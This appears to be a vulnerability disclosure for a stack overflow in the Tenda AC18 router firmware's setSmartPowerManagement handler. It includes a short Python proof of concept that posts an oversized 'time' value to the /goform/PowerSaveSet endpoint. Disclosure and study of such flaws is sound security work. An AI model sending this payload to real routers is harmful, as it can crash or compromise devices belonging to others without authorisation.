## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda AC18 V15.03.05.05 firmware has a stack overflow vulnerability in the `setSmartPowerManagement` function. The `v13` variable receives the `time` parameter from a POST request and `v13` is directly parsed into the `v10`, `v9`, `v8` and `v7`. However, since the user can control the input of `time`, the statement `sprintf(s, "%s:%s", (const char *)v10, (const char *)v9); sprintf(v5, "%s:%s", (const char *)v8, (const char *)v7);` can cause a buffer overflow by  `v10`, `v9`, `v8` and `v7`. 

![image-20240305230652504](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305230652504.png)

![image-20240305230641177](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305230641177.png)

![image-20240305230630107](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305230630107.png)

## PoC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/PowerSaveSet"
payload = 'a'*1000 + ':aaaa-bbb:1'


data = {"time": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240305230734921](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305230734921.png)
